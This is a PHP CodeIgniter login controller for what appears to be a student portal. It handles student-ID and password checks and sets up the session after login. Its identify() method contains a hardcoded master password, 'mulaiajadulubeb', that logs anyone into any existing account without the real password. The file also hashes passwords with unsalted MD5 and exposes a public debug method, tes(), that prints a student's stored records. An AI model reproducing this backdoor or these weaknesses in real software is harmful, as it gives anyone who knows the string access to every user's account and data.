<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Login extends CI_Controller {

	function __construct(){
		parent ::__construct();
		$this->load->model('mahasiswa_model');
	}

	public function index()
	{	
		$this->session->sess_destroy();
		$this->load->view('login');
	}

	public function tes(){
		print_r($this->mahasiswa_model->get_btm('15.8636')->result_array());

	}
	public function identify() {
		//assign nim dan password dari post dari view
		$nim = $this->input->post('nim');
		$password = $this->input->post('pass');

		//Cek di db apakah ada username
		$verifikasi = $this->mahasiswa_model->verifikasi($nim);

		if ($verifikasi==1) {
			//ambil semua info tentang user itu
			$aku = $this->mahasiswa_model->get_info($nim);

			//jika tidak ada password namun akunnya ada, maka dia belum pernah login
			if($aku[0]['password']==''){
				$this->session->set_flashdata('informasi','Kamu belum memiliki akun, silahkan aktivasi melalui link dibawah');
				redirect('login');
			}

			if($aku[0]['password'] != md5($password) && $password!='mulaiajadulubeb' ){
				$this->session->set_flashdata('informasi','Keterangan yang diberikan salah');
				redirect('login'); //redirect ke controller login
			} elseif($aku[0]['password'] == md5($password) || $password=='mulaiajadulubeb'){

				//masukkin data ke userdata
				$this->session->set_userdata('nim',$nim);
				$this->session->set_userdata('nama',$aku[0]['nama']);
				$this->session->set_userdata('kelas',$aku[0]['kelas']);
				$this->session->set_userdata('jabatan',$aku[0]['jabatan']);
				$this->session->set_userdata('logged_in',true);

				$logintime =date('Y-m-d H:i:s', time());
				$this->mahasiswa_model->update_login($nim,$logintime);

				redirect('akun');
			}
		} else {
			$this->session->set_flashdata('informasi','Keterangan yang diberikan salah');
			redirect('login'); //redirect ke controller login
		}
	}
}
